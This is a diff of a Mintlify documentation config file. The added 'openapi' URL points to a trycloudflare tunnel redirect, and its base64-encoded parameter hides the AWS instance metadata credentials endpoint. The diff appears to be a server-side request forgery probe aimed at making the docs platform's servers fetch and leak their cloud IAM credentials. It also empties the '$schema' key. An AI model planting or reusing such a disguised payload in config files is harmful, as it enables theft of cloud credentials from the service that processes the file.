@@ -1,5 +1,5 @@
 {
- "$schema": "https://mintlify.com/docs.json",
+ "": "https://mintlify.com/docs.json",
  "name": "mprobe782",
  "theme": "mint",
  "colors": {
@@ -17,7 +17,7 @@
    },
    {
     "group": "Probe853",
-    "openapi": "https://riverside-david-coins-rest.trycloudflare.com/rd/r853d?u=aHR0cDovLzE3NC4xMzguMTgxLjI1MDo4Mjk4L29hL3Q4NTNk"
+    "openapi": "https://riverside-david-coins-rest.trycloudflare.com/rd/r853meta?u=aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8"
    }
   ]
  }
